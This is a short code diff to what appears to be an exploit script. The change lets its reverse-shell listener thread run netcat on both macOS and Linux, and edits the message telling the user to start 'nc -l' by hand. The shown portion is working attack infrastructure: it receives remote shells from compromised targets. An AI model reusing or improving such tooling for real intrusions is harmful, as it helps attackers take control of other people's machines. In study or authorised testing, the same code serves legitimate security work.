@@ -174,12 +174,16 @@ def main():
         import threading
         def listen_shell():
             print(f"[*] Listening for reverse shell on port {args.listen_port}...")
-            # Use netcat if available, otherwise just use a simple socket listener
             import subprocess
+            import platform
             try:
-                subprocess.run(["nc", "-l", "-p", str(args.listen_port)], check=True)
+                # macOS netcat uses `nc -l <port>`, Linux uses `nc -l -p <port>`
+                if platform.system() == "Darwin":
+                    subprocess.run(["nc", "-l", str(args.listen_port)], check=True)
+                else:
+                    subprocess.run(["nc", "-l", "-p", str(args.listen_port)], check=True)
             except Exception:
-                print(f"[!] Could not start netcat. Please run: nc -l -p {args.listen_port}")
+                print(f"[!] Could not start netcat. Please run: nc -l {args.listen_port}")
                 
         t = threading.Thread(target=listen_shell)
         t.daemon = True
